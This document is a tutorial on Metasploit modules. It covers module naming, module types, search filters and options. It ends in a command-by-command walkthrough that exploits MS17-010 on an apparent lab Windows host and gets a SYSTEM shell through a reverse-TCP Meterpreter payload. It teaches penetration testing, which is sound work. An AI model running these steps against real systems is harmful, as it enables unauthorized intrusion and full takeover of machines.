# Metasploit Framework: Modules 

---

## Table of Contents

1. [What modules actually are](#1-what-modules-actually-are)
2. [Important mindset: a failed exploit ≠ no vulnerability](#2-important-mindset-a-failed-exploit--no-vulnerability)
3. [Module naming structure](#3-module-naming-structure)
4. [The module types](#4-the-module-types)
5. [Searching for modules](#5-searching-for-modules)
6. [Worked example: finding and picking a module](#6-worked-example-finding-and-picking-a-module)
7. [Using a module: options, info, and targets](#7-using-a-module-options-info-and-targets)
8. [Full walkthrough: MS17-010 (EternalRomance)](#8-full-walkthrough-ms17-010-eternalromance)
9. [Cheat sheet](#9-cheat-sheet)

---

## 1. What modules actually are

A **module** is a pre-built, pre-tested script with one specific job. The **exploit** modules in particular are "proof-of-concepts" (POCs): ready-made code that takes advantage of a known vulnerability, mostly automatically.

**Analogy:** think of modules like apps on a phone. Each one does one thing well (a flashlight app, a calculator app). Metasploit is the phone's app store, and `msfconsole` is the home screen where you launch them.

---

## 2. Important mindset: a failed exploit ≠ no vulnerability

This is one of the most important lessons in the whole topic:

> **If a Metasploit exploit fails, that does not prove the target isn't vulnerable.** It only proves that *this particular script, with its current settings, didn't work this time.*

Why does this happen? Many exploits need to be **customized** for the specific target (OS build, patch level, architecture, service configuration) before they'll actually work.

**Takeaway:** Metasploit is a **support tool**, not a replacement for your own manual analysis and skill. If an automated exploit fails, the next step is to investigate manually, not to assume the target is safe.

---

## 3. Module naming structure

Every module follows a predictable path, so once you know the pattern you can "read" a module name at a glance.

```
<No.>  <type>/<os>/<service>/<name>
```

### Example

```
794   exploit/windows/ftp/scriptftp_list
```

| Part | Example value | Meaning |
|---|---|---|
| **No.** | `794` | The index number. Lets you select the module quickly (e.g. `use 794`) instead of typing the full path. |
| **Type** | `exploit` | What category of action this module performs (see the table below). |
| **OS** | `windows` | Which operating system / architecture the module targets. |
| **Service** | `ftp` | The vulnerable service on the target. For `auxiliary`/`post` modules, this can be a general category like `gather` instead of a specific service. |
| **Name** | `scriptftp_list` | The specific action this module performs. |

**Analogy:** it's a lot like a file path on your computer — `type/os/service/name` tells you exactly which "drawer" the module lives in before you even open it.

---

## 4. The module types

The **Type** field is the first and biggest way Metasploit sorts its modules. Some types are directly "runnable" (you can `use` them to start an attack), while others support the process without being launched on their own.

| Type | What it does |
|---|---|
| **Auxiliary** | Scanning, fuzzing, sniffing, and admin tasks. Extra assistance and functionality, not direct exploitation. |
| **Encoders** | Keep payloads intact as they travel to the target (encode around bad characters, filters, etc.). |
| **Exploits** | Take advantage of a vulnerability to deliver a payload. |
| **NOPs** | "No Operation" filler code. Keeps payload sizes consistent across different exploit attempts. |
| **Payloads** | The code that runs on the target and calls back to you to open a connection (shell). |
| **Plugins** | Extra scripts that extend `msfconsole` and run alongside your assessment. |
| **Post** | Modules used after you already have access: gathering info, pivoting deeper, etc. |

### Which types can you actually `use`?

Only three of these types are **"interactable"** — meaning you can select them directly with `use <no.>` and run them as the starting point of an action:

| Type | Why it's interactable |
|---|---|
| **Auxiliary** | Can be run directly (e.g. a port scanner). |
| **Exploits** | Can be run directly to deliver a payload. |
| **Post** | Can be run directly once you already have a session. |

Encoders, NOPs, Payloads, and Plugins play **supporting roles** — they get pulled in *by* an exploit or *by* the console, rather than being launched on their own as the main action.

---

## 5. Searching for modules

Metasploit has a built-in `search` command that lets you filter thousands of modules down to the ones that matter for your target.

```
msf6 > help search
```

### Basic search

```
msf6 > search eternalromance

Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
```

### Narrowing with `type:`

```
msf6 > search eternalromance type:exploit

Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
```

### Stacking multiple filters

You can combine several filters to get very precise results:

```
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/windows/http/exchange_proxylogon_rce    2021-03-02       excellent  Yes    Microsoft Exchange ProxyLogon RCE
   1  exploit/windows/http/exchange_proxyshell_rce    2021-04-06       excellent  Yes    Microsoft Exchange ProxyShell RCE
   2  exploit/windows/http/sharepoint_unsafe_control  2021-05-11       excellent  Yes    Microsoft SharePoint Unsafe Control and ViewState RCE
```

### Filter reference

| Filter | What it narrows by | Example |
|---|---|---|
| `type:` | Module category | `type:exploit` |
| `platform:` | Target OS | `platform:windows` |
| `cve:` | CVE year | `cve:2021` |
| `rank:` | Reliability ranking | `rank:excellent` |
| *(free text)* | Keyword match in the name/description | `microsoft` |

> **Tip:** Think of this like adding filters on a shopping website — each `filter:value` pair narrows the results further, and plain words act like a search bar keyword.

---

## 6. Worked example: finding and picking a module

**Scenario:** You've scanned a target and found SMB open on port 445, running an old Windows version.

```bash
$ nmap -sV 10.10.10.40

445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
```

That banner (`Windows 7 - 10 microsoft-ds`) is a strong hint this could be vulnerable to the well-known **MS17-010 / EternalRomance** family of SMB exploits.

### Step 1: search for it

```
msf6 > search ms17_010
```

### Step 2: pick the right module

Combining the Nmap result with a bit of extra OS fingerprinting, you determine the target is likely **Windows 7** with a vulnerable SMB implementation. From the search results, you select the module at index **2** to first **check** whether the target is actually vulnerable (rather than firing the exploit blind).

> **Good habit:** many exploit modules support a `check` command that tests for vulnerability without actually exploiting it. Use it before you `run` whenever it's available.

---

## 7. Using a module: options, info, and targets

Once a module is selected, you'll almost always need to adjust some settings before it will work against *your specific target*. The two commands you'll use constantly are `options` and `info`.

### Selecting by index number

```
msf6 > use 0
msf6 exploit(windows/smb/ms17_010_psexec) >
```

Notice how the prompt changes to show which module is active. This is also why the index number (**No.**) from the search results is so handy — you type `use 0` instead of the entire path.

### Viewing required options

```
msf6 exploit(windows/smb/ms17_010_psexec) > options
```

```
Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                         rdlists/named_pipes.txt
   RHOSTS                                                         yes       The target host(s)
   RPORT                 445                                      yes       The Target port (TCP)
   SHARE                 ADMIN$                                   yes       The share to connect to
   SMBDomain             .                                        no        The Windows domain to use for authentication
   SMBPass                                                        no        The password for the specified username
   SMBUser                                                        no        The username to authenticate as

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique
   LHOST                      yes       The listen address
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

**How to read this table:**

- Every row with **`yes`** under **Required** must have a value before you `run`.
- `RHOSTS` is blank: you must fill this in — it's the target.
- `LHOST` is blank too: this is *your* IP, where the reverse shell calls back to.
- `RPORT` and `LPORT` already have sensible defaults (445 for SMB, 4444 for the listener).

### Getting more detail: `info`

```
msf6 exploit(windows/smb/ms17_010_psexec) > info
```

This shows extended details about the module: author, references (like CVE numbers), a description, and more — useful when you want to double check exactly what a module does before firing it.

### Setting the target

```
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40

RHOSTS => 10.10.10.40
```

### `set` vs `setg`: temporary vs. permanent

| Command | Scope | Use it when… |
|---|---|---|
| `set OPTION value` | Applies only to the **currently selected module** | You're quickly testing one module |
| `setg OPTION value` | **Global** — stays set across different modules until you restart msfconsole | You're focused on one target/IP for a while and don't want to re-type it every time you switch modules |

```
msf6 exploit(windows/smb/ms17_010_psexec) > setg RHOSTS 10.10.10.40

RHOSTS => 10.10.10.40
```

### Setting your own IP (LHOST)

Since the default payload here is a **reverse TCP** shell (`windows/meterpreter/reverse_tcp`), the target needs to know *where to call back to*. That's your machine's IP, set via `LHOST`:

```
msf6 exploit(windows/smb/ms17_010_psexec) > setg LHOST 10.10.14.15

LHOST => 10.10.14.15
```

> **Reminder from Part 1:** reverse shells = target connects out to you. Bind shells = you connect in to the target. Reverse is more common because outbound traffic is usually allowed through firewalls.

---

## 8. Full walkthrough: MS17-010 (EternalRomance)

Putting it all together, end to end:

```bash
# 1. Recon with Nmap
$ nmap -sV 10.10.10.40
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds
```

```
# 2. Launch msfconsole and search
msf6 > search ms17_010

# 3. Select the module
msf6 > use 0
msf6 exploit(windows/smb/ms17_010_psexec) >

# 4. Set the target
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40

# 5. Set your own IP for the callback
msf6 exploit(windows/smb/ms17_010_psexec) > setg LHOST 10.10.14.15

# 6. Fire it
msf6 exploit(windows/smb/ms17_010_psexec) > run
```

**Result — you land in a Meterpreter session:**

```
meterpreter> shell

C:\Windows\system32>
```

**Confirm who you are on the target:**

```
C:\Windows\system32> whoami

nt authority\system
```

`nt authority\system` is the highest privilege level on Windows — the equivalent of `root` on Linux. In this case, the exploit happened to drop you straight into a SYSTEM-level shell.

> **Why this example is "quick and dirty":** no payload selection, no encoding, no pivoting between sessions or jobs was needed. Real-world targets are often more defended and will need more of the adjustments covered above (and in later sections).

---

## 9. Cheat sheet

### Module path anatomy

```
<No.> <type>/<os>/<service>/<name>
```

### Interactable types (you can `use` these directly)

```
auxiliary   exploit   post
```

### Search syntax

| Command | Result |
|---|---|
| `search <keyword>` | Keyword match across all modules |
| `search type:exploit <keyword>` | Only exploit modules |
| `search platform:windows` | Only Windows-targeting modules |
| `search cve:2021` | Only modules tied to 2021 CVEs |
| `search rank:excellent` | Only the most reliable modules |
| `search type:exploit platform:windows cve:2021 rank:excellent microsoft` | All filters combined |

### Module workflow commands

| Command | Purpose |
|---|---|
| `use <no.>` or `use <path>` | Select a module |
| `info` | Show detailed info about the selected module |
| `options` / `show options` | Show required and optional settings |
| `set OPTION value` | Set an option for this module only |
| `setg OPTION value` | Set an option globally, across modules |
| `check` | Test if the target is vulnerable (if supported), without exploiting |
| `run` / `exploit` | Launch the module |

### Key options you'll set constantly

| Option | Meaning |
|---|---|
| `RHOSTS` | The target(s) |
| `RPORT` | The target port |
| `LHOST` | Your IP (where reverse shells call back to) |
| `LPORT` | The port you're listening on |

### Big-picture takeaways

1. **A failed exploit doesn't mean "no vulnerability."** It may just need customization.
2. **Module names are structured and readable**: `type/os/service/name`.
3. **Only auxiliary, exploit, and post modules are directly runnable.** The rest support them.
4. **`search` with filters** (`type:`, `platform:`, `cve:`, `rank:`) is the fastest way to narrow thousands of modules down to a handful.
5. **`set` is per-module, `setg` is global** — use `setg` when you're staying focused on one target.
6. **Always check `options` before `run`** — anything marked `Required: yes` must be filled in.

---
